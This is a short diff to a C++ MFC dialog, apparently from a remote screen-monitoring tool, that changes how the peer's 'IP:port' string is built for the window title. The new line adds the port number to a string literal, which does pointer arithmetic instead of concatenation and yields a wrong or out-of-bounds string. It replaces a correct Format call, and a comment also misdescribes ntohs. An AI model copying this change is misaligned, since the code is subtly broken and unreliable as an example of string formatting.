@@ -78,8 +78,9 @@ void CScreenDlg::SetConnSocket(SOCKET miansocket, SOCKET helpsocket)
 	sockaddr_in addr;
 	int cb = sizeof(addr);
 	int ir = getpeername(m_ConnSocket, (sockaddr*)&addr, &cb);
-	CString OnlineIP;
-	OnlineIP.Format(_T("%s:%d"), CString(inet_ntoa(addr.sin_addr)), ntohs(addr.sin_port));//ntohs函数将u_long转int
+	CString OnlineIP(inet_ntoa(addr.sin_addr));
+	OnlineIP += ":" + ntohs(addr.sin_port);
+	//OnlineIP.Format(_T("%s:%d"), CString(inet_ntoa(addr.sin_addr)), ntohs(addr.sin_port));//ntohs函数将u_long转int
 
 	SetWindowText(_T("[屏幕监控] ") + OnlineIP);
 }
